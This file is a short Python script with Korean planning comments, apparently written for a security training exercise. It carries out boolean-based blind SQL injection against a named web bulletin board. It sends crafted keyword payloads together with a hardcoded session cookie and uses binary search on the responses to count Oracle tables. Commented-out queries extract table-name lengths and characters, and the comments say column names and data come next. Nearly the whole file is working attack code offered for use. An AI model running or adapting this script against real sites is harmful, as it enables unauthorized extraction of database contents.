# 이진탐색 필수
# 1. table명 
# select table_name from user_tables
#     - table 개수
#     - table 문자열 길이
#     - table 문자열 (1~문자열 길이)
# 2. column명
#     - 
# 3. 데이터

import requests

url = 'http://elms1.skinfosec.co.kr:8082/community6/free'
param = { "searchType" : "all", "keyword" : "yahoo%' and 1=1 and '1%'='1" }
jsession = {
    'JSESSIONID':'4C3A63C5103FFDCD1529AEFB602807B6'
}

contype = {
    'Content-Type':'application/x-www-form-urlencoded'
}

keywordbase = "yahoo%' and {} and '1%'='1"
querybase = "(select count(table_name) from user_tables) > {}"
# querybase = "(select length(table_name) from (select table_name, rownum as rnum from user_tables) where rnum = 1) > {}"
# querybase = "(select substr(table_name, {}, 1) from (select table_name, rownum as rnum from user_tables) where rnum = 1) > {}"
min = 1
max = 127
while min != max :
    avg = int( ( min + max ) / 2 )
    query = querybase.format(avg)
    param["keyword"] = keywordbase.format(query)
    res = requests.post( url, data = param, cookies = jsession, headers = contype )

    if 'REIZEI' in res.text :
        min = avg + 1
    else :
        max = avg

print(str(min))